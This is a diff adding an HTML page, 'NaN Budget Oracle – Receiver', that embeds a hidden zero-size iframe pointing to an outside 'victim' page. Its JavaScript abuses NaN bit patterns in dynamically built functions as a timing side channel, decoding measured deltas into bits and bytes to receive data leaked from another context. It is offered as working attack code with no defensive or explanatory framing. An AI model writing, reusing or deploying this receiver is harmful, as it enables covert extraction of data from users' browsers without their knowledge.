@@ -1,0 +1,124 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>NaN Budget Oracle – Receiver</title>
+
+<iframe src="https://cnfdnfial-ops.github.io/spoof/victim.html"
+        style="width:0;height:0;border:0"></iframe>
+
+<pre id="log"></pre>
+
+<script>
+// ===== CORE =====
+const nan = new Float64Array(new Uint8Array(8).fill(0xff).buffer)[0];
+
+function measure({ size = 120, bsize = 40, r = Math.random() } = {}) {
+  const c = new Function('nan', `
+    const arr = []
+    for (let i = 0; i < ${size}; i++) arr[i] = [nan]
+    const r = ${r}
+    if (r < 0) { ${'p();'.repeat(bsize)} }
+    return arr
+  `);
+
+  const arr = c(nan);
+  let res = 0;
+
+  for (let i = 0; i < arr.length; i++) {
+    const u8 = new Uint8Array(new Float64Array(arr[i]).buffer);
+    if (u8[0] !== 0xff) res = i;
+  }
+  return res;
+}
+
+function sampleDelta() {
+  const r = Math.random();
+  const a = measure({ r });
+  const b = measure({ r });
+  return b - a;
+}
+
+// ===== DECODER =====
+function decodeSymbol(delta) {
+  if (delta < 3) return '00';
+  if (delta < 7) return '01';
+  if (delta < 12) return '10';
+  return '11';
+}
+
+// ===== SIGNAL DETECTION =====
+function signalStrength() {
+  let hits = 0;
+  for (let i = 0; i < 20; i++) {
+    if (sampleDelta() > 3) hits++;
+  }
+  return hits;
+}
+
+// ===== SYNC + RECEIVE =====
+let buffer = '';
+let synced = false;
+
+function trySync(bits) {
+  return bits.includes("11111111"); // detect preamble
+}
+
+function log(msg) {
+  document.getElementById('log').textContent += msg + "\n";
+  console.log(msg);
+}
+
+function start() {
+  log("[*] Receiver started...");
+
+  setInterval(() => {
+    const strength = signalStrength();
+    log("[dbg] signal strength: " + strength);
+
+    if (strength > 5) {
+      log("[+] Strong signal detected (likely same-process)");
+      runReceiver();
+    } else {
+      log("[-] Weak signal...");
+    }
+  }, 1500);
+}
+
+function runReceiver() {
+  if (synced) return;
+  synced = true;
+
+  log("[*] Syncing...");
+
+  setInterval(() => {
+    const d = sampleDelta();
+    const sym = decodeSymbol(d);
+
+    buffer += sym;
+
+    if (!trySync(buffer)) return;
+
+    log("[+] Synced!");
+
+    // trim sampai sync
+    buffer = buffer.slice(buffer.indexOf("11111111") + 8);
+
+    setInterval(() => {
+      const d2 = sampleDelta();
+      const sym2 = decodeSymbol(d2);
+
+      buffer += sym2;
+
+      if (buffer.length >= 8) {
+        const byte = buffer.slice(0, 8);
+        buffer = buffer.slice(8);
+
+        const char = String.fromCharCode(parseInt(byte, 2));
+        log("BYTE " + byte + " -> " + char);
+      }
+    }, 120);
+
+  }, 120);
+}
+
+start();
+</script>
